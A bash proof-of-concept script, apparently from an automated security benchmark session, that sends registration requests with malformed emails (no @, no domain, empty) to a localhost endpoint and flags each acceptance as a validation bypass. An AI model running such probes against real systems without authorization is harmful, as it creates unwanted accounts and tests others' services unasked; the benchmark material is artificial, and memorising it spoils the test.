#!/bin/bash
# POC: Demonstrates email validation bypass in registration endpoint - accepts invalid email formats without @ symbol, missing domains, and empty emails
# Target: ./repo
# Created: 2025-12-02T16:19:47.167Z
# Session: benchmark-XBEN-069-24-miorxjei

# Email Validation Bypass POC
# Tests /api/register.php endpoint for improper email validation

TARGET_URL="http://localhost:8080/api/register.php"

echo "=========================================="
echo "Email Validation Bypass POC"
echo "=========================================="
echo "Target: $TARGET_URL"
echo ""

# Test 1: Email without @ symbol
echo "[TEST 1] Email without @ symbol"
echo "Payload: email=notanemail"
RESPONSE1=$(curl -s -X POST "$TARGET_URL" \
  -d 'username=invalidemail1&password=test123&email=notanemail' \
  -H "Content-Type: application/x-www-form-urlencoded")
echo "Response: $RESPONSE1"
if echo "$RESPONSE1" | grep -q "success.*true"; then
  echo "✓ VULNERABLE: Invalid email (no @) was accepted"
else
  echo "✗ Email rejected (expected)"
fi
echo ""

# Test 2: Email with @ but no domain
echo "[TEST 2] Email with @ but no domain"
echo "Payload: email=@nodomain"
RESPONSE2=$(curl -s -X POST "$TARGET_URL" \
  -d 'username=invalidemail2&password=test123&email=@nodomain' \
  -H "Content-Type: application/x-www-form-urlencoded")
echo "Response: $RESPONSE2"
if echo "$RESPONSE2" | grep -q "success.*true"; then
  echo "✓ VULNERABLE: Invalid email (@ but no domain) was accepted"
else
  echo "✗ Email rejected (expected)"
fi
echo ""

# Test 3: Empty email
echo "[TEST 3] Empty email"
echo "Payload: email= (empty)"
RESPONSE3=$(curl -s -X POST "$TARGET_URL" \
  -d 'username=emptyemail&password=test123&email=' \
  -H "Content-Type: application/x-www-form-urlencoded")
echo "Response: $RESPONSE3"
if echo "$RESPONSE3" | grep -q "success.*true"; then
  echo "✓ VULNERABLE: Empty email was accepted"
else
  echo "✗ Email rejected (expected)"
fi
echo ""

# Test 4: Valid email (control test)
echo "[TEST 4] Valid email (control test)"
echo "Payload: email=valid@example.com"
RESPONSE4=$(curl -s -X POST "$TARGET_URL" \
  -d 'username=validemail&password=test123&email=valid@example.com' \
  -H "Content-Type: application/x-www-form-urlencoded")
echo "Response: $RESPONSE4"
if echo "$RESPONSE4" | grep -q "success.*true"; then
  echo "✓ Valid email accepted (expected)"
else
  echo "✗ Valid email rejected (unexpected)"
fi
echo ""

echo "=========================================="
echo "Summary: Email validation bypass confirmed"
echo "=========================================="